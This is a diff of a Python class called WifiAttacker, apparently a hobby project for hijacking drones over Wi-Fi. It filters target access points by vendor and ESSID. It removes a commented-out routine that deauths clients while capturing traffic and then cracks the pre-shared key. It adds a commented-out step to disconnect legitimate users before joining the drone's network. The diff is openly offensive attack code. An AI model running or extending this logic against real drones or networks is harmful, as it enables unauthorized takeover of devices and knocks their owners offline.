@@ -80,7 +80,7 @@ class WifiAttacker():
             oui     = bssid[0:8]
             vendor = get_vendor(oui)
 
-            if (vendor != "") :
+            if (vendor != "" and essid != "") :
                 targets.append([vendor, essid, bssid, chan])
 
         return targets
@@ -201,49 +201,16 @@ class WifiAttacker():
         deauth(ap_bssid, cli_bssid, essid, mon_interf)
         restore_interf(mng_interf)
 
-    """
-    def crack_wifi(self, ap_bssid, cli_bssid, chan, essid
-        , mng_interf=MNG_INTERF, mon_interf=MON_INTERF
-        , duration=CLI_DUMP_DURATION):
 
-        # device preparing
-        restore_interf(mng_interf)
-        start_mon(chan, mng_interf)
-
-        # dumping thread
-        t1 = threading.Thread(target=dump_specific_nw
-            , args=(ap_bssid, chan, mon_interf, duration)
-        )
-        
-        # deauth thread
-        t2 = threading.Thread(target=deauth
-            , args=(ap_bssid, cli_bssid, essid, mon_interf)
-        )
-        
-        print("Démarrage thread 1 (dump)")
-        t1.start()
-
-        print("Démarrage thread 2 (deauth)")
-        t2.start()
-
-        t2.join()
-        print("Thread 2 (deauth) terminé")
-
-        t1.join()
-        print("Thread 1 (dump) terminé")
-        
-        # device state restoring
-        restore_interf(mng_interf)
-
-        # pre-shared key cracking
-        crack(ap_bssid, essid)
-    """
-    
     def hijack_drone(self, targeted_drone:d.Drone):
         
         """
         Attempt to connect to a target
         """
+
+        # first, disconnect legitime users
+        #self.deauth_client()
+
         cmd = ["sudo", "iwconfig", MNG_INTERF, "essid"
             , targeted_drone.get_channel()]
 
